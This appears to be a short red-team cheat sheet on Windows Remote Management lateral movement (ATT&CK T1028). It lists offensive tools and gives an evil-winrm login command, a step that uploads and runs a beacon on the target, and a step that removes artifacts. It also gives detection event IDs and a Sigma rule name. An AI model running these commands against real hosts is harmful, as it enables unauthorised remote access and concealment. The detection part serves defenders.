# T1028 – Windows Remote Management (WinRM)

## 🎯 Objective
Execute remote PowerShell via WinRM for lateral movement or initial payload execution.

---

## 🧰 Tools
| Tool | Purpose |
|------|----------|
| Evil-WinRM | interactive lateral shell |
| PowerShell Remoting | `Enter-PSSession` / `Invoke-Command` |
| CrackMapExec | enumerate + execute cmd via WinRM |
| Rubeus/Impacket | token passthrough & auth |

---

## ✅ Checklist
1. Enable WinRM (allowed on targets).
2. Execute: `evil-winrm -i <IP> -u <user> -p <pass>`
3. Drop & run beacon (`upload beacon.exe; .\beacon.exe`)
4. Clean up session and remove artifacts.

---

## ⚕ Detection
| Source | Event | Indicator |
|---------|--------|-----------|
| PowerShell Operational | 4103, 4104 | Remote script execution |
| Windows Security | 4624‑Type 3 + Event 10164 | WinRM network logon |
| Sigma | `winrm_execution_remote.yml`


Author : yasinabedini
GitHub : https://github.com/yasinabedini

